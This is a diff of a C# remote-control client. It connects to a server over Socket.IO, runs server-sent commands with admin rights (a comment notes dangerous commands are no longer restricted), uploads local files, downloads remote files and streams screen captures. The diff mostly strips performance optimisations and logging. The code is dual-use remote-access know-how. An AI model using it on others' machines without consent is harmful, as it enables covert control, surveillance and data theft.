@@ -31,11 +31,6 @@ namespace RemoteCore
         private bool _isRunning = false;
         private bool _vncActive = false;
         private bool _cameraInitialized = false;
-        
-        // VNC性能优化字段
-        private Bitmap? _previousFrame = null;
-        private readonly object _frameLock = new object();
-        private DateTime _lastFrameTime = DateTime.MinValue;
 
         // P/Invoke for VNC input simulation
         [DllImport("user32.dll")]
@@ -47,21 +42,6 @@ namespace RemoteCore
 
         [DllImport("user32.dll")]
         static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
-
-        // P/Invoke for fast screen capture using BitBlt
-        [DllImport("user32.dll")]
-        static extern IntPtr GetDesktopWindow();
-
-        [DllImport("user32.dll")]
-        static extern IntPtr GetDC(IntPtr hWnd);
-
-        [DllImport("user32.dll")]
-        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
-
-        [DllImport("gdi32.dll")]
-        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
-
-        const uint SRCCOPY = 0x00CC0020;
 
         const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
         const uint MOUSEEVENTF_LEFTUP = 0x0004;
@@ -75,30 +55,15 @@ namespace RemoteCore
         private const int ConnectTimeout = 30;
         private const int ReconnectInterval = 10;
         private const int CommandTimeout = 30;
-        private const int VncFps = 15;
-        private const int VncQuality = 35;
+        private const int VncFps = 10;
+        private const int VncQuality = 40;
         private static readonly System.Drawing.Size VncResolution = new System.Drawing.Size(1280, 720);
-        private const int DownloadBufferSize = 81920; // 80KB 缓冲区
-        private const int UploadBufferSize = 81920;   // 80KB 缓冲区
-        private const int FileTransferTimeoutMinutes = 30; // 文件传输超时 30 分钟
-        
-        // VNC性能优化常量
-        private const int DiffDetectionThreshold = 5000; // 差异检测阈值（像素差异数）
-        private const int MinFrameIntervalMs = 30; // 最小帧间隔（约33fps）
 
         public RemoteClient()
         {
-            var handler = new HttpClientHandler
-            {
-                AllowAutoRedirect = true,
-                MaxAutomaticRedirections = 5,
-                UseCookies = false
-            };
-            
-            _httpClient = new HttpClient(handler, disposeHandler: true);
-            _httpClient.Timeout = TimeSpan.FromMinutes(FileTransferTimeoutMinutes);
+            _httpClient = new HttpClient();
+            _httpClient.Timeout = TimeSpan.FromSeconds(ConnectTimeout);
             _httpClient.DefaultRequestHeaders.Add("User-Agent", "RemoteClient");
-            _httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate");
             _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _authToken);
 
             _socket = new SocketIOClientSocket(_serverUrl, new SocketIOOptions
@@ -404,8 +369,6 @@ namespace RemoteCore
             if (string.IsNullOrWhiteSpace(command)) return;
 
             Console.WriteLine($"Received command: {command}");
-            Console.WriteLine($"Current user: {System.Security.Principal.WindowsIdentity.GetCurrent().Name}");
-            Console.WriteLine($"Is admin check result: {IsAdmin()}");
 
             string output = "";
             string error = "";
@@ -424,10 +387,7 @@ namespace RemoteCore
                 else
                 {
                     // 检查是否具有管理员权限
-                    bool isAdmin = IsAdmin();
-                    Console.WriteLine($"IsAdmin() returned: {isAdmin}");
-                    
-                    if (!isAdmin)
+                    if (!IsAdmin())
                     {
                         Console.WriteLine("Command execution requires admin privileges, but not running as admin");
                         error = "Error: Administrator privileges required for this command.";
@@ -435,7 +395,6 @@ namespace RemoteCore
                     }
                     else
                     {
-                        Console.WriteLine("Running command with admin privileges...");
                         // 执行命令（不再限制危险命令）
                         using var process = new Process
                         {
@@ -543,25 +502,17 @@ namespace RemoteCore
                     return;
                 }
 
-                var fileInfo = new FileInfo(path);
-                Console.WriteLine($"Starting upload: {path} ({fileInfo.Length / 1024.0 / 1024.0:F2} MB)");
-
                 using var content = new MultipartFormDataContent();
-                // 使用大缓冲区的 FileStream 提高读取性能
-                using var fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read, UploadBufferSize, FileOptions.Asynchronous | FileOptions.SequentialScan);
-                var streamContent = new StreamContent(fileStream, UploadBufferSize);
+                using var fileStream = File.OpenRead(path);
+                var streamContent = new StreamContent(fileStream);
                 content.Add(streamContent, "file", filename);
                 content.Add(new StringContent(filename), "filename");
 
-                Console.WriteLine("Sending upload request...");
                 var response = await _httpClient.PostAsync($"{_serverUrl}/client_upload_file", content);
                 response.EnsureSuccessStatusCode();
-                Console.WriteLine("Upload completed successfully");
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Upload error: {ex.Message}");
-                Console.WriteLine($"Stack trace: {ex.StackTrace}");
                 await _socket.EmitAsync("client_upload_error", new { error = ex.Message });
             }
         }
@@ -582,222 +533,71 @@ namespace RemoteCore
                     throw new UnauthorizedAccessException("Path traversal detected");
 
                 if (!Directory.Exists(fullTargetDir)) Directory.CreateDirectory(fullTargetDir);
-
-                Console.WriteLine($"Starting download: {url} -> {targetPath}");
-
-                // 使用 HttpCompletionOption.ResponseHeadersRead 提高大文件下载性能
-                using var response = await _httpClient.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
+                var response = await _httpClient.GetAsync(url);
                 response.EnsureSuccessStatusCode();
 
-                long? totalBytes = response.Content.Headers.ContentLength;
-                Console.WriteLine($"File size: {(totalBytes.HasValue ? $"{totalBytes.Value / 1024.0 / 1024.0:F2} MB" : "unknown")}");
+                using var fs = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None);
+                await response.Content.CopyToAsync(fs);
 
-                // 使用流式下载，避免将整个文件加载到内存
-                using var contentStream = await response.Content.ReadAsStreamAsync();
-                using var fs = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None, DownloadBufferSize, FileOptions.Asynchronous | FileOptions.SequentialScan);
-
-                var buffer = new byte[DownloadBufferSize];
-                int bytesRead;
-                long totalRead = 0;
-                DateTime lastProgressReport = DateTime.MinValue;
-
-                while ((bytesRead = await contentStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
-                {
-                    await fs.WriteAsync(buffer, 0, bytesRead);
-                    totalRead += bytesRead;
-
-                    // 每 1 秒或每下载 1MB 报告一次进度
-                    if ((DateTime.Now - lastProgressReport).TotalSeconds >= 1 || 
-                        (totalBytes.HasValue && totalRead % (1024 * 1024) < DownloadBufferSize))
-                    {
-                        double progress = totalBytes.HasValue ? (double)totalRead / totalBytes.Value * 100 : 0;
-                        Console.WriteLine($"Download progress: {progress:F1}% ({totalRead / 1024.0 / 1024.0:F2} MB)");
-                        lastProgressReport = DateTime.Now;
-                    }
-                }
-
-                await fs.FlushAsync();
-                Console.WriteLine($"Download completed successfully: {targetPath}");
                 await _socket.EmitAsync("client_download_complete", new { success = true, path = targetPath });
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Download error: {ex.Message}");
-                Console.WriteLine($"Stack trace: {ex.StackTrace}");
                 await _socket.EmitAsync("client_download_complete", new { error = ex.Message });
             }
         }
 
-        private Bitmap? CaptureScreenFast()
-        {
-            try
-            {
-                Rectangle bounds = Rectangle.Empty;
-                foreach (Screen screen in Screen.AllScreens)
-                {
-                    bounds = Rectangle.Union(bounds, screen.Bounds);
-                }
-
-                if (bounds.Width == 0 || bounds.Height == 0)
-                    return null;
-
-                IntPtr hdcSrc = GetDC(IntPtr.Zero);
-                if (hdcSrc == IntPtr.Zero)
-                    return null;
-
-                try
-                {
-                    Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
-                    using (Graphics g = Graphics.FromImage(bitmap))
-                    {
-                        IntPtr hdcDest = g.GetHdc();
-                        try
-                        {
-                            BitBlt(hdcDest, 0, 0, bounds.Width, bounds.Height, hdcSrc, bounds.Left, bounds.Top, SRCCOPY);
-                        }
-                        finally
-                        {
-                            g.ReleaseHdc(hdcDest);
-                        }
-                    }
-                    return bitmap;
-                }
-                finally
-                {
-                    ReleaseDC(IntPtr.Zero, hdcSrc);
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Screen capture error: {ex.Message}");
-                return null;
-            }
-        }
-
-        private bool HasSignificantChanges(Bitmap current, Bitmap previous)
-        {
-            if (current.Size != previous.Size)
-                return true;
-
-            int diffCount = 0;
-            int step = Math.Max(4, current.Width / 50); // 更大的步长提高性能
-            
-            for (int y = 0; y < current.Height && diffCount < DiffDetectionThreshold; y += step)
-            {
-                for (int x = 0; x < current.Width && diffCount < DiffDetectionThreshold; x += step)
-                {
-                    Color currentColor = current.GetPixel(x, y);
-                    Color previousColor = previous.GetPixel(x, y);
-                    
-                    int diff = Math.Abs(currentColor.R - previousColor.R) +
-                               Math.Abs(currentColor.G - previousColor.G) +
-                               Math.Abs(currentColor.B - previousColor.B);
-                    
-                    if (diff > 30) // 颜色差异阈值
-                    {
-                        diffCount++;
-                    }
-                }
-            }
-
-            return diffCount >= DiffDetectionThreshold;
-        }
-
         private async Task VncLoopAsync()
         {
-            if (_vncActive) return;
+            if (_vncActive) return; // Prevent multiple loops
             _vncActive = true;
-            Console.WriteLine("VNC Loop started (optimized)");
-
+            Console.WriteLine("VNC Loop started");
+            
+            // 提取出循环外以减少分配和提高性能
             var encoder = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
             using var encoderParams = new EncoderParameters(1);
-            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)VncQuality);
-
-            // 复用 MemoryStream 减少分配
-            using var ms = new MemoryStream(1024 * 1024); // 预分配1MB缓冲区
-            int frameCount = 0;
-            DateTime startTime = DateTime.Now;
+            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)VncQuality); // 使用配置的质量
 
             while (_vncActive && _isRunning)
             {
                 try
                 {
-                    // 帧率控制
-                    TimeSpan elapsed = DateTime.Now - _lastFrameTime;
-                    if (elapsed.TotalMilliseconds < MinFrameIntervalMs)
+                    // 捕获所有显示器
+                    Rectangle bounds = Rectangle.Empty;
+                    foreach (Screen screen in Screen.AllScreens)
                     {
-                        await Task.Delay(MinFrameIntervalMs - (int)elapsed.TotalMilliseconds);
+                        bounds = Rectangle.Union(bounds, screen.Bounds);
+                    }
+                    
+                    using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
+                    using (Graphics g = Graphics.FromImage(bitmap))
+                    {
+                        g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                     }
 
-                    using Bitmap? fullFrame = CaptureScreenFast();
-                    if (fullFrame == null)
+                    // Resize to configured resolution to save bandwidth
+                    using Bitmap resized = new Bitmap(bitmap, VncResolution);
+                    using MemoryStream ms = new MemoryStream();
+                    
+                    if (encoder != null)
                     {
-                        await Task.Delay(100);
-                        continue;
-                    }
-
-                    // 调整大小以节省带宽
-                    using Bitmap resized = new Bitmap(fullFrame, VncResolution);
-
-                    bool shouldSend = true;
-                    lock (_frameLock)
-                    {
-                        if (_previousFrame != null)
-                        {
-                            shouldSend = HasSignificantChanges(resized, _previousFrame);
-                        }
-                        
-                        // 始终更新上一帧（无论是否发送）
-                        _previousFrame?.Dispose();
-                        _previousFrame = new Bitmap(resized);
-                    }
-
-                    if (shouldSend)
-                    {
-                        ms.Position = 0;
-                        ms.SetLength(0);
-
-                        if (encoder != null)
-                        {
-                            resized.Save(ms, encoder, encoderParams);
-                        }
-                        else
-                        {
-                            resized.Save(ms, ImageFormat.Jpeg);
-                        }
-
-                        string base64 = Convert.ToBase64String(ms.GetBuffer(), 0, (int)ms.Length);
-                        await _socket.EmitAsync("vnc_frame", new { image = base64 });
-
-                        frameCount++;
-                        _lastFrameTime = DateTime.Now;
-
-                        // 每30帧输出一次性能统计
-                        if (frameCount % 30 == 0)
-                        {
-                            TimeSpan totalElapsed = DateTime.Now - startTime;
-                            double fps = frameCount / totalElapsed.TotalSeconds;
-                            Console.WriteLine($"VNC FPS: {fps:F1}, Frame: {frameCount}");
-                        }
+                        resized.Save(ms, encoder, encoderParams);
                     }
                     else
                     {
-                        // 画面无变化，稍微延迟
-                        await Task.Delay(50);
+                        resized.Save(ms, ImageFormat.Jpeg);
                     }
+                    
+                    string base64 = Convert.ToBase64String(ms.ToArray());
+                    await _socket.EmitAsync("vnc_frame", new { image = base64 });
+                    
+                    await Task.Delay(1000 / VncFps); // 使用配置的帧率
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine($"VNC loop error: {ex.Message}");
-                    await Task.Delay(500);
+                    await Task.Delay(1000);
                 }
-            }
-
-            // 清理
-            lock (_frameLock)
-            {
-                _previousFrame?.Dispose();
-                _previousFrame = null;
             }
             Console.WriteLine("VNC Loop stopped");
         }
